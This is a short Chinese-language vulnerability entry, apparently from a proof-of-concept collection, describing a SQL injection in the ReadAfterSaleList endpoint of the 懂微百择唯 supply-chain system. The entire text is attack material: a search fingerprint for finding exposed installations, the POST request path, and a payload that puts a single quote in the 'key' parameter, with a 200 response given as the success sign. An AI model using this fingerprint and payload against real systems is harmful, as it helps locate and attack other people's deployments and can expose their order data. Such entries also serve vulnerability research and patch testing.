# 懂微百择唯供应链ReadAfterSaleListSQL注入漏洞

懂微百择唯供应链ReadAfterSaleList ｜ SQL注入 ｜ —
- **指纹**：`body="/Content/Css/_SiteCss/"`
- **请求**：`POST /AfterSale/ReadAfterSaleList HTTP/1.1`

**Payload**
```
time=%E8%BF%91%E4%B8%80%E5%91%A8%E8%AE%A2%E5%8D%95&state=%E5%B7%B2%E7%AD%BE%E6%94%B6&key='&index=1&rows=10
```
- **响应特征**：200